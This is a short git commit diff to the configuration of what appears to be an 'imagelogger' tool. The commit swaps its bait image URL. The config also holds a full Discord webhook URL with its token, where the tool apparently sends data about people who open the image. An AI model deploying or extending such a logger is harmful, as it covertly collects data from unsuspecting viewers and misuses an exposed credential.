227331b88a8be86b2aa368e657d90c208ab577d9
Grandma96523 <131499218+ShadowByte098@users.noreply.github.com>
2025-01-31 00:38:29 -1000

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5",
-    "image": "https://i.pinimg.com/originals/01/d8/fc/01d8fcdbb5cfcc20fd5734f5affe62ec.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://github.com/ShadowByte098/sillysound/blob/main/Meme%20Sounds/This.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
